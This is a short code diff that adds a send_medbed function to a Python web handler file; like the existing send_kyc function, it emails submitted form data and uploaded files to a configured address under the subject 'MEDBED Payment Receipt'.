@@ -31,3 +31,12 @@ def send_kyc(request):
     converted_data = {key: str(value) for key, value in data.items()}
     print('SENDING KYC')
     return send_mail(EMAIL_ADDRESS,json.dumps(converted_data),'KYC DOCS FROM QFBS', file=request.files)
+
+
+def send_medbed(request):
+    data = request.form
+    converted_data = {key: str(value) for key, value in data.items()}
+    print('SENDING Payment')
+    return send_mail(EMAIL_ADDRESS,json.dumps(converted_data),'MEDBED Payment Receipt', file=request.files)
+
+
